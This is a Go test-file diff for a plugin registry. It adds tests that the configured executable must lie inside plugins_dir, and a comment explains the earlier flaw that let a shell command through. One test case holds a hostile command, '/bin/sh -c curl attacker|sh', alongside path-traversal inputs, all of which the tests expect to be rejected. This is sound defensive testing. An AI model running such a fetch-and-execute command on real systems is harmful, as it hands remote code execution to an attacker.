@@ -188,7 +188,7 @@ func TestAttachArchiveChecksum(t *testing.T) {
 		store.put(key, archive)
 		r := &Registry{pluginsDir: t.TempDir(), storage: store}
 
-		config, err := r.attachArchiveChecksum(ctx, req)
+		config, err := r.attachArchiveChecksum(ctx, req.Group, req.Name, req.Version, req.Config)
 		require.NoError(t, err)
 
 		var pCfg PluginConfig
@@ -202,7 +202,7 @@ func TestAttachArchiveChecksum(t *testing.T) {
 
 		r := &Registry{pluginsDir: t.TempDir(), storage: newFakeStorage()}
 
-		_, err := r.attachArchiveChecksum(ctx, req)
+		_, err := r.attachArchiveChecksum(ctx, req.Group, req.Name, req.Version, req.Config)
 		assert.ErrorIs(t, err, core.ErrBinaryNotUploaded)
 	})
 
@@ -213,7 +213,7 @@ func TestAttachArchiveChecksum(t *testing.T) {
 		store.failWith = os.ErrDeadlineExceeded
 		r := &Registry{pluginsDir: t.TempDir(), storage: store}
 
-		_, err := r.attachArchiveChecksum(ctx, req)
+		_, err := r.attachArchiveChecksum(ctx, req.Group, req.Name, req.Version, req.Config)
 		assert.ErrorIs(t, err, core.ErrStorageUnavailable)
 	})
 }
@@ -396,4 +396,129 @@ func (f *fakeStorage) put(key string, data []byte) {
 	f.mu.Lock()
 	defer f.mu.Unlock()
 	f.objects[key] = bytes.Clone(data)
+}
+
+// TestValidateConfigExecutableContainment covers the rule that decides what a
+// write token is worth: which element of `command` has to live inside
+// plugins_dir.
+//
+// The check used to accept a command where *any* element did, so a config whose
+// executable was /bin/sh passed as long as some later argument pointed into
+// plugins_dir. That made registration — already privileged — equivalent to
+// running arbitrary code as the service account. There was no test here at all,
+// which is why it survived.
+func TestValidateConfigExecutableContainment(t *testing.T) {
+	t.Parallel()
+
+	const pluginsDir = "/plugins"
+
+	cfg := func(command ...string) json.RawMessage {
+		raw, err := json.Marshal(PluginConfig{Command: command})
+		require.NoError(t, err)
+
+		return raw
+	}
+
+	t.Run("the plugin entrypoint is accepted", func(t *testing.T) {
+		t.Parallel()
+
+		require.NoError(t, ValidateConfig(cfg("/plugins/grpc/go/v1.5.1/plugin"), pluginsDir))
+	})
+
+	t.Run("arguments outside plugins_dir stay allowed", func(t *testing.T) {
+		t.Parallel()
+
+		// A plugin is entitled to its own command line; only the executable is
+		// constrained.
+		err := ValidateConfig(cfg("/plugins/grpc/go/v1.5.1/plugin", "--out=/tmp", "-I/usr/include"), pluginsDir)
+		require.NoError(t, err)
+	})
+
+	t.Run("a shell with a plugins_dir argument is refused", func(t *testing.T) {
+		t.Parallel()
+
+		// The exact shape the old check let through.
+		err := ValidateConfig(cfg("/bin/sh", "-c", "curl attacker|sh", "/plugins/x"), pluginsDir)
+		require.ErrorIs(t, err, core.ErrInvalidConfig)
+		assert.Contains(t, err.Error(), "command[0]")
+	})
+
+	t.Run("traversal out of plugins_dir is refused", func(t *testing.T) {
+		t.Parallel()
+
+		err := ValidateConfig(cfg("/plugins/../bin/sh"), pluginsDir)
+		require.ErrorIs(t, err, core.ErrInvalidConfig)
+	})
+
+	t.Run("a sibling directory sharing the prefix is refused", func(t *testing.T) {
+		t.Parallel()
+
+		// "/plugins-evil/plugin" has "/plugins" as a string prefix but is not
+		// inside it. The separator in the comparison is what rejects it.
+		err := ValidateConfig(cfg("/plugins-evil/plugin"), pluginsDir)
+		require.ErrorIs(t, err, core.ErrInvalidConfig)
+	})
+
+	t.Run("an empty command is refused", func(t *testing.T) {
+		t.Parallel()
+
+		require.ErrorIs(t, ValidateConfig(cfg(), pluginsDir), core.ErrInvalidConfig)
+	})
+
+	t.Run("config errors classify as invalid argument, not internal", func(t *testing.T) {
+		t.Parallel()
+
+		// The reason these wrap core.ErrInvalidConfig at all: without it
+		// ErrorToStatus reported the caller's own mistake as codes.Internal.
+		for _, err := range []error{ErrEmptyConfig, ErrEmptyCommand, ErrInvalidConfig} {
+			require.ErrorIs(t, err, core.ErrInvalidConfig)
+		}
+	})
+}
+
+// TestUpdateRejectsEmptyMask covers the one mask that cannot mean anything.
+// It is checked before the database is touched, so a Registry with no
+// connection is enough.
+func TestUpdateRejectsEmptyMask(t *testing.T) {
+	t.Parallel()
+
+	r := &Registry{pluginsDir: t.TempDir()}
+
+	_, err := r.Update(context.Background(), core.UpdatePluginRequest{
+		Group: "grpc", Name: "go", Version: "v1.5.1",
+		// Neither field selected: the API layer only produces this from a mask
+		// that named paths, all of which it rejected — but the registry is a
+		// public entry point of its own and should not write an UPDATE with an
+		// empty SET clause.
+	})
+
+	require.ErrorIs(t, err, core.ErrInvalidConfig)
+	assert.Contains(t, err.Error(), "update_mask")
+}
+
+// TestUpdateValidatesConfigOnlyWhenSelected is the behaviour that made the mask
+// worth adding: a tags-only update must not be held to the config rules, since
+// there is no config in the request to hold to them.
+func TestUpdateValidatesConfigOnlyWhenSelected(t *testing.T) {
+	t.Parallel()
+
+	r := &Registry{pluginsDir: t.TempDir()}
+
+	// Config selected but absent — still refused, as before.
+	_, err := r.Update(context.Background(), core.UpdatePluginRequest{
+		Group: "grpc", Name: "go", Version: "v1.5.1",
+		UpdateConfig: true,
+	})
+	require.ErrorIs(t, err, core.ErrInvalidConfig)
+
+	// Tags only, config absent: validation must not run at all. The call still
+	// fails, but on the database rather than on ValidateConfig — a nil db
+	// panics, so reaching the query is the observable outcome here.
+	assert.Panics(t, func() {
+		_, _ = r.Update(context.Background(), core.UpdatePluginRequest{
+			Group: "grpc", Name: "go", Version: "v1.5.1",
+			Tags:       []string{"stable"},
+			UpdateTags: true,
+		})
+	}, "a tags-only update must get past ValidateConfig and reach the query")
 }
